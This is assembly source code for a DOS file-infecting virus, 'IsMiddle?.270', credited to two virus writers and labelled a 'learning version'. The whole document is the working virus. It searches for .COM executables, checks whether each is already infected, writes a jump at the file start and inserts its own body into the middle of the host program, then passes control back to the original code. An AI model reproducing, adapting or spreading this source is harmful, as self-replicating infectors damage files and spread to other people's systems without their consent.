         NAME	IsMiddle?
         TITLE	The 'IsMiddle?' virus, version IsMiddle?.270

; ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                Jakarta, Indonesia - 01/02/00 [DD/MM/YY]                   บ
; บ                                                                           บ
; บ     (c)Copyright by Ding Lik and Shadow Dancer, Virus Research, 2000      บ
; ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
; Mid infection
; Learning version
; For U, Me & All of us
; ding_lik99@email.com
	Ideal
	Model	Tiny
	DataSeg
	CodeSeg
	Radix	16
	StartUpCode
StartDeVirusen:
	db 0E9, 0, 0

Part_I:
	call $ + 3
	pop bp
	sub bp, Offset $ - 1

	mov cx, VirSize
	push si
	pop di
	lea si, [bp + OriginBytes]
	movsw
	movsb

	mov ah, 4e
	lea dx, [bp + Victim]
	mov cx, 27
	int 21
	jc Z

	mov ax, 3D02
	mov dx, 9E
	int 21
	xchg ax, bx

Z:
	pushf
	mov ax, es
	add ax, 1000
	mov es, ax

	mov cx, VirSize
	add cx, [Word bp + SizePart]
	lea si, [bp + Part_I]
	mov di, si
	rep movsb

	mov ax, es
	mov ds, ax
	push cs
	lea ax, [bp + New_IP]
	pop es
	push ds
	push ax
	retf

New_IP:
	popf
	jnc $ + 5
	jmp RestoreProgy

	mov ah, 3f
	lea dx, [ds:bp + OriginBytes]
	mov cx, 3
	int 21
	cmp [ds:bp + OriginBytes], 0E9
	jnz Infect
	jmp RestoreProgy

Infect:
	mov ax, 4202
	cwd
	xor cx, cx
	int 21
	push dx
	push ax

	mov cx, 2
	div cx
	mov [Word ds:bp + NewJmp + 1], ax
	sub [Word ds:bp + NewJmp + 1], 3
	add dx, ax
	mov [ds:bp + SizePart], dx

	mov ax, 4200
	cwd
	xor cx, cx
	int 21

	mov ah, 40
	mov cx, 3
	lea dx, [ds:bp + NewJmp]
	int 21

	mov ax, 4200
	mov cx, 0
	mov dx, [Word ds:bp + NewJmp + 1]
	add dx, 3
	int 21

	lea dx, [ds:bp + Buffer]
	mov ah, 3f
	mov cx, [Word ds:bp + SizePart]
	int 21

	mov ax, 4200
	mov cx, 0
	mov dx, [Word ds:bp + NewJmp + 1]
	add dx, 3
	int 21

	mov ah, 40
	lea dx, [ds:bp + Part_I]
	mov cx, VirSize
	int 21
	mov ah, 40
	lea dx, [ds:bp + Buffer]
	mov cx, [Word ds:bp + SizePart]
	int 21

	pop ax
	pop dx

RestoreProgy:
	mov ah, 3E
	int 21
	lea si, [ds:bp + EndOfViren]
	lea di, [bp + Part_I]
	mov cx, [bp + SizePart]
	rep movsb

	push es es
	pop ds
	mov dx, 100
	push dx
	retf

Victim		db '*.COM', 0
OriginBytes	db 90, 90, 0C3
NewJmp		db 0E9, 0, 0
SizePart	dw 0
Label		Buffer	Byte

EndOfViren	= $
VirSize		= EndOfViren - Part_I
	End